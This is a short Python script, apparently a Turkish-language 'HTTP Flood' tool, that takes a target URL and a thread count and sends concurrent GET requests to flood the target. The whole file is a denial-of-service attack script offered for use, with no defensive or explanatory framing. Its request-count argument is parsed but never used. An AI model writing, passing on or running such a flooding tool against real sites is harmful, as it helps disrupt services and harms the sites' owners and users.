import argparse
import threading
import requests
from colorama import init, Fore

init(autoreset=True)

def http_flood(target_url, request_count, thread_count):
    def send_request():
        try:
            requests.get(target_url)
            print(Fore.GREEN + "[+] İstek Gönderildi")
        except:
            print(Fore.RED + "[-] Hata! İstek başarısız.")

    threads = [threading.Thread(target=send_request) for _ in range(thread_count)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Flood Aracı")
    parser.add_argument("url", type=str, help="Hedef URL")
    parser.add_argument("count", type=int, help="İstek Sayısı")
    parser.add_argument("threads", type=int, help="Thread Sayısı")

    args = parser.parse_args()
    http_flood(args.url, args.count, args.threads)
